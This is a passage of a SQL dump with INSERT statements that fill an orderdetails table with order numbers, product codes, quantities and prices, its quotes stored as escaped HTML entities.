\u0026#39;S18_1889\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;62.37\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;113.80\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;137.17\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;69.15\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;133.76\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;59.06\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;145.82\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;34.74\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;50.82\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;136.22\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;67.10\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10122\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;33.79\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10123\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;120.71\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10123\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;114.84\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10123\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;117.26\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10123\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;43.27\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;153.00\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;58.12\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;111.87\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;75.46\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;66.28\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;62.47\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;30.53\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;36.29\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;74.51\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;93.95\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;76.19\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;101.73\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10124\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;36.11\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10125\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;89.38\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10125\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;138.38\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;205.73\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;122.62\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;135.30\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;116.67\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;51.21\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;51.05\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;93.21\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;61.84\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;93.20\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;94.25\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;102.92\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;47.29\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;122.68\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;83.76\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;82.83\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;62.05\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10126\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;97.10\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;193.25\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;140.50\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;169.56\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;100.73\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;140.81\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;114.14\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;149.02\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;126.39\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;50.86\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;34.30\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;107.63\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;46.53\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;60.90\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;111.12\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10127\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;55.65\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10128\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;120.20\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10128\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;80.67\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10128\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;77.24\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10128\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;72.75\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;123.76\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;113.06\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;81.43\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;76.31\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;58.67\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;72.28\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;90.15\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;94.34\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10129\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;44.23\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10130\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;68.82\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10130\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;99.52\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10131\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;141.92\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10131\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;60.97\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10131\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;52.60\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10131\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;54.59\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10131\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;76.94\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10131\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;86.76\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10131\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;63.67\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10131\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;40.22\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10132\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;80.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10133\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;80.26\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10133\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;109.42\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10133\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;61.58\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10133\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;80.91\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10133\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;67.41\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10133\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;37.09\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10133\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;76.73\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10133\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;115.09\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10134\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;90.92\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10134\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;116.56\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10134\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;187.85\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10134\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;131.04\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10134\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;51.48\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10134\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;94.67\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10134\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;75.41\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;173.17\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;110.39\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;72.62\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;103.64\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;66.99\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;65.94\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;139.64\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;49.74\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;133.92\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;67.18\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;34.36\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;52.05\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;139.03\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;76.80\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;38.62\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;91.85\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10135\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;78.92\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10136\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;117.48\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10136\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;120.91\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10136\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;169.34\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10137\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;115.73\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10137\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;110.88\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10137\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;118.68\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10137\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;40.25\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;149.60\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;51.46\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;114.42\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;79.15\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;64.86\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;59.53\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;33.19\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;38.53\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;73.60\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;96.30\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;77.05\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;99.58\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10138\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;32.82\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10139\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;89.38\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10139\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;52.83\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10139\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;41\u0026#39;, 